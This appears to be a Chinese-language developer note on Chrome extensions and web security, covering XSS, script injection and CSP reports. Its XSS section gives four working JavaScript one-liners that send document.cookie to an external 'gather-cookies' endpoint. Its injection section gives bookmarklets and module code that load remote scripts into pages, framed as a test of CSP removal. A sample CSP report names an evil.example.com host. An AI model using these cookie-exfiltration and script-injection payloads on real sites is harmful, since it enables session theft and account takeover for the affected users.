
# [参考文档](https://developer.chrome.com/docs/extensions/mv3/manifest/) 
# [use-a-content-script-to-access-the-page-context-variables-and-functions](https://stackoverflow.com/questions/9515704/use-a-content-script-to-access-the-page-context-variables-and-functions)

## Cross-Site Scripting (XSS) 一句话cookie就丢了
> 在Cookie中设置了"HttpOnly"属性，通过JS脚本将无法读取到Cookie信息，这样能有效的防止XSS攻击。
> Chrome 新增的可信类型（Trusted types） 

```javascript

fetch('https://test.proxy.xiaoshuogeng.com/gather-cookies?cookies='+encodeURIComponent(document.cookie));

(new Image(100, 200)).setAttribute('src','https://test.proxy.xiaoshuogeng.com/gather-cookies?cookies='+encodeURIComponent(document.cookie));

new Audio('https://test.proxy.xiaoshuogeng.com/gather-cookies?cookies='+encodeURIComponent(document.cookie))

const url = 'https://test.proxy.xiaoshuogeng.com/gather-cookies';
  const data = JSON.stringify({
    cookie: document.cookie
  });
  fetch(url, {
    method: 'POST',
    mode: 'cors',
    headers: {
      'Content-Type': 'application/json'
    },
    body: data
  })

  


```

```javascript



```



## javascript 注入
```javascript
//浏览器控制台执行代码,  检验移除CSP是否生效
javascript:(()=>{
    let script=document.createElement('script');
    script.setAttribute('src','https://frontend-inject.xieyaokun.com/main.js'),
    script.setAttribute('type','application/javascript'),
    script.setAttribute('charset','utf-8'),document.body.appendChild(script)
})();


//保存为书签使用
javascript:(()=>{ let script=document.createElement('script');script.setAttribute('src','https://frontend-inject.xieyaokun.com/main.js'), script.setAttribute('type','application/javascript'),script.setAttribute('charset','utf-8'),document.body.appendChild(script) })();


//ES6 模块形式
var script=document.createElement('script');
script.setAttribute('type','module'),
    script.setAttribute('charset','utf-8'),
    script.innerHTML=`
import app from  'https://cloud-soft.xieyaokun.com/js/index.js'
app(); 
  
`
script.onload=(obj)=>{
    console.log(obj)
    script.remove();
}
document.body.appendChild(script)


```

## CSP REPORT
```JSON

{
  "csp-report": {
    "document-uri": "http://example.org/page.html",
    "referrer": "http://evil.example.com/",
    "blocked-uri": "http://evil.example.com/evil.js",
    "violated-directive": "script-src 'self' https://apis.google.com",
    "original-policy": "script-src 'self' https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser"
  }
}


```
